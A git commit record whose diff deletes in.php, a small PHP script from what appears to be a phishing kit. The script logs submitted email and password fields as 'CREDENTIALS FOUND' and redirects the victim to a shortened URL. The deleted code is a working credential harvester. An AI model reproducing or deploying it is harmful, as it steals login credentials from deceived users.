0cd4fb2801dbb4ae05ffe6cd098d1ced7ff32f61
dharick <58396545+dharick@users.noreply.github.com>
2022-08-26 16:38:47 +0530

    Delete in.php

--- in.php
+++
@@ -1,9 +0,0 @@
-<?php
-$username = $_POST['Email'];
-$password = $_POST['password'];
-$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
-error_log("[+] Credentials Found!!!");
-error_log("$res");
-echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
-?>
-
